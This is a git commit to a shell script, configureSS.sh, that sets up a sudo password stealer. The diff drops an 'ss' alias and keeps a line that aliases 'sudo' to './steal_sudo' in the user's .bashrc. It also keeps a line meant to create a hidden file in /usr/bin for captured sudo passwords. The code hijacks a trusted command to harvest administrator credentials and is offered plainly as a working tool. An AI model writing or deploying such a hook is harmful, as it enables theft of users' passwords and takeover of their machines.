187e2601a3045bdbc98081f97072ca3be12e2f39
ArnavSax <44127903+ArnavSax@users.noreply.github.com>
2018-11-05 16:36:24 -0800

    Update configureSS.sh

--- configureSS.sh
+++ configureSS.sh
@@ -1,3 +1,2 @@
-echo -n "alias ss='./steal_sudo'" >> /home/$USER/.bashrc
 echo -n "alias sudo='./steal_sudo'" >> /home/$USER/.bashrc
 cat "#This file stores sudo passwords" > /usr/bin/.passwordsfromSS
